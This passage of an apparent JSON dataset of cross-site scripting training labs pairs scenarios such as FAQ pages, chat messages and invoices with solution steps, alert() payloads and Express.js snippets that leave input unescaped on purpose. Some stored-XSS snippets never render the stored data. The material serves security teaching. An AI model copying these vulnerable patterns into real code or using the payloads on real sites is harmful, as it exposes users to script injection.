        "payloads": [
            "<script>alert('Bio')</script>",
            "<img src=x onerror=alert('Profile')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in conference session proposal form",
        "Lab Description": "Speakers submit proposals including session abstracts. Abstracts are rendered on the public agenda page without sanitization. To solve: Submit a malicious abstract.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "POST /submit-session with abstract=<script>alert('Session')</script>",
            "Check /agenda for execution.",
            "Test with other tags like <style> or <iframe>.",
            "Use Burp to observe storage details.",
            "Validate script fires without login."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-session', (req, res) => {\n  const abstract = req.body.abstract;\n  db.query(\"INSERT INTO sessions (abstract) VALUES (?)\", [abstract]);\n  res.send('Proposal received');\n});",
        "payloads": [
            "<script>alert('Session')</script>",
            "<iframe srcdoc='<script>alert(1)</script>'></iframe>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in contact form reply page",
        "Lab Description": "After users submit a contact form, their name and message are echoed in a reply page without escaping. To solve: Inject a script in the message input.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "POST /contact with message=<svg onload=alert('Contact')>",
            "Observe rendering of the message on reply screen.",
            "Try <script> tags and <img> tags.",
            "Test both GET and POST contexts.",
            "Confirm DOM injection using DevTools."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/contact', (req, res) => {\n  const msg = req.body.message;\n  res.send(`<div>Reply: ${msg}</div>`);\n});",
        "payloads": [
            "<svg onload=alert('Contact')>",
            "<script>alert('Form')</script>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in classroom discussion board",
        "Lab Description": "The classroom platform allows students to post questions. These posts are stored and rendered without escaping HTML. To solve: Inject a persistent XSS payload in a question submission.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "POST /ask-question with question=<script>alert('ClassXSS')</script>",
            "View the board as another user.",
            "Observe the payload executing.",
            "Inspect the DOM with DevTools.",
            "Confirm persistence across sessions."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/ask-question', (req, res) => {\n  const question = req.body.question;\n  db.query(\"INSERT INTO questions (content) VALUES (?)\", [question]);\n  res.send('Question posted');\n});",
        "payloads": [
            "<script>alert('ClassXSS')</script>",
            "<img src=x onerror=alert('Board')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in resume preview form",
        "Lab Description": "The resume builder reflects user input in the live preview. No sanitization is done. To solve: Inject a script in the 'skills' field and trigger XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "POST /preview-resume with skills=<svg onload=alert('Skills')>",
            "View the preview response.",
            "Try with <img> and <iframe> tags.",
            "Use Burp to verify reflection.",
            "Confirm behavior across browsers."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/preview-resume', (req, res) => {\n  const skills = req.body.skills;\n  res.send(`<div>Your Skills: ${skills}</div>`);\n});",
        "payloads": [
            "<svg onload=alert('Skills')>",
            "<script>alert('Resume')</script>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in user-submitted FAQ content",
        "Lab Description": "Users can suggest FAQ entries. These are reviewed by admins and displayed directly on the FAQ page. Input is not sanitized. To solve: Inject script in the question or answer field.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "POST /submit-faq with answer=<script>alert('FAQ')</script>",
            "Open FAQ page and view entry.",
            "Confirm execution on load.",
            "Use <svg> tag variants to test.",
            "Ensure persistence across reloads."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-faq', (req, res) => {\n  const answer = req.body.answer;\n  db.query(\"INSERT INTO faqs (answer) VALUES (?)\", [answer]);\n  res.send('Submitted');\n});",
        "payloads": [
            "<script>alert('FAQ')</script>",
            "<svg onload=alert('FAQ')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in online invoice client name field",
        "Lab Description": "The invoice generator reflects the client name after generation. The name is not escaped before being inserted into the DOM. To solve: Inject XSS in the client name field.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "POST /generate-invoice with name=<script>alert('Invoice')</script>",
            "Observe the name reflected.",
            "Test various HTML tag injections.",
            "Verify execution via browser console.",
            "Try encoded variations."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/generate-invoice', (req, res) => {\n  const name = req.body.name;\n  res.send(`<p>Invoice for: ${name}</p>`);\n});",
        "payloads": [
            "<script>alert('Invoice')</script>",
            "<img src=1 onerror=alert('Client')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in public travel diary entries",
        "Lab Description": "Users can submit travel experiences as diary entries. These are displayed on a public feed without filtering HTML content. To solve: Inject a script into the diary body.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "POST /add-diary with entry=<script>alert('Travel')</script>",
            "Visit the public diary feed.",
            "Confirm execution occurs.",
            "Try obfuscated versions of the payload.",
            "Verify across multiple browsers."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-diary', (req, res) => {\n  const entry = req.body.entry;\n  db.query(\"INSERT INTO diaries (content) VALUES (?)\", [entry]);\n  res.send('Diary posted');\n});",
        "payloads": [
            "<script>alert('Travel')</script>",
            "<svg onload=alert('Diary')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in e-commerce coupon generator",
        "Lab Description": "Users receive a coupon preview with their name. The name is reflected back into the HTML. To solve: Inject script into the name parameter.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "POST /coupon-preview with name=<img src=x onerror=alert('Coupon')>",
            "Inspect reflected content.",
            "Test with encoded characters.",
            "Confirm payload renders as HTML.",
            "Try in different browsers."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/coupon-preview', (req, res) => {\n  const name = req.body.name;\n  res.send(`<h2>Hello ${name}, here is your coupon!</h2>`);\n});",
        "payloads": [
            "<img src=x onerror=alert('Coupon')>",
            "<script>alert('CouponGen')</script>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in chatroom private messages",
        "Lab Description": "Private messages in the chatroom are stored and displayed using innerHTML without filtering. To solve: Inject a persistent XSS payload into the message content.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "POST /send-message with message=<script>alert('Private')</script>",
            "Login as recipient and check inbox.",
            "Observe script execution.",
            "Use DevTools to monitor changes.",
            "Confirm persistence after logout/login."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/send-message', (req, res) => {\n  const message = req.body.message;\n  db.query(\"INSERT INTO messages (body) VALUES (?)\", [message]);\n  res.send('Message sent');\n});",
        "payloads": [
            "<script>alert('Private')</script>",
            "<img src=x onerror=alert('Chat')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in IT support ticket notes",
        "Lab Description": "Users can leave notes on their IT support tickets. These notes are stored and rendered on the support view without escaping. To solve: Inject a payload in the note body.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "POST /add-ticket-note with note=<svg onload=alert('Ticket')>",
            "Login as support and view ticket.",
            "Verify execution in dashboard.",
            "Check DOM via DevTools.",
            "Test with alternative tags."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-ticket-note', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO ticket_notes (note) VALUES (?)\", [note]);\n  res.send('Note saved');\n});",
        "payloads": [
            "<svg onload=alert('Ticket')>",
            "<script>alert('Support')</script>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in newsletter signup thank-you page",
        "Lab Description": "The thank-you page reflects the user’s email address after signup. Email is not escaped. To solve: Inject script into the email field.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "POST /signup-newsletter with email=<svg onload=alert('Mail')>",
            "Observe reflection in the thank-you message.",
            "Test with <script> and <img> payloads.",
            "Use OWASP ZAP to replay the request.",
            "Verify payload executes properly."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/signup-newsletter', (req, res) => {\n  const email = req.body.email;\n  res.send(`<p>Thank you for subscribing, ${email}!</p>`);\n});",
        "payloads": [
            "<svg onload=alert('Mail')>",
            "<script>alert('Newsletter')</script>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in food delivery review system",
        "Lab Description": "Customers can submit reviews on food deliveries. These reviews are shown publicly without sanitation. To solve: Inject XSS into the review content.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "POST /leave-review with review=<script>alert('Food')</script>",
            "Open the food item page.",
            "Confirm script executes.",
            "Test with <img> and <iframe> variants.",
            "Check storage with Burp Suite."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/leave-review', (req, res) => {\n  const review = req.body.review;\n  db.query(\"INSERT INTO reviews (text) VALUES (?)\", [review]);\n  res.send('Review submitted');\n});",
        "payloads": [
            "<script>alert('Food')</script>",
            "<img src=x onerror=alert('Delivery')>"
        ]
    }
]